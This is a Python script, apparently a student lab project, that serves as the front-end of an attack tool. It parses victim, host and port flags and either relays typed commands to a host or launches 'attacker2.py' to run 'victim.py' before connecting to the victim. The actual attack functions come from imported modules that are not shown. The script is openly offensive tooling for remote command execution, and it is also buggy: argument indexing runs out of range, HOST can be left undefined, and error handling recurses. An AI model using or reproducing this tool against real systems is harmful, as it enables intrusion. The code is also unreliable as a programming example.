import socket
import os
import subprocess
from attacker2 import notReal
from attacker import real

print("\n                            ---- WELCOME ----")
print("                syntax: 2ic80 [-r -v VICTIM] -h HOST [-p PORT]")

def getCommand():
	command = input("\n~ $: ").split()
	VICTIM, HOST, PORT = checkValidityCommand(command)

	return VICTIM, HOST, PORT, checkRealtime(command)

def checkRealtime(command):
	if command[1] == "-r":
		return True
	else:
		return False

def checkValidityCommand(command):
	VICTIM = "127.0.0.0"
	PORT = 1024

	if len(command) == 0:
		print("general: wrong length")
		main()

	if command[0] == "exit()":
		exit()

	if "-r" in command and "-p" in command and len(command) == 8:
		VICTIM = command[3]
		HOST = command[5]
		PORT = command[7]
	elif "-r" in command and "-p" not in command and len(command) == 6:
		VICTIM = command[3]
		HOST = command[5]
	elif "-r" not in command and "-p" in command and len(command) == 4:
		HOST = command[2]
		PORT = command[4]
	elif "-r" not in command and "-p" not in command and len(command) == 3:
		HOST = command[2]
	else:
		print("general: wrong length")
		getCommand()

	try:
		#TODO check validity ip
		pass
	except:
		print("-h: wrong format")
		getCommand()

	try:
		PORT = int(PORT)
	except:
		print("-p: wrong format")
		getCommand()

	return VICTIM, HOST, PORT

def checkSocketOpen(VICTIM, PORT):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	return sock.connect_ex((VICTIM, PORT))

def main():
	VICTIM, HOST, PORT, realtime = getCommand()

	if realtime == False:
		action = input("enter command to relay ~ $: ")
		notReal(HOST, PORT, action)
		main()
	elif realtime == True:
		subprocess.run(['gnome-terminal', '-x', 'python3', 'attacker2.py', HOST, str(PORT), "python3 victim.py"])

		while checkSocketOpen(VICTIM, PORT) != 0:
			pass

		if checkSocketOpen(VICTIM, PORT) == 0:
			real(VICTIM, PORT)
			main()
		else:
			main()

main()
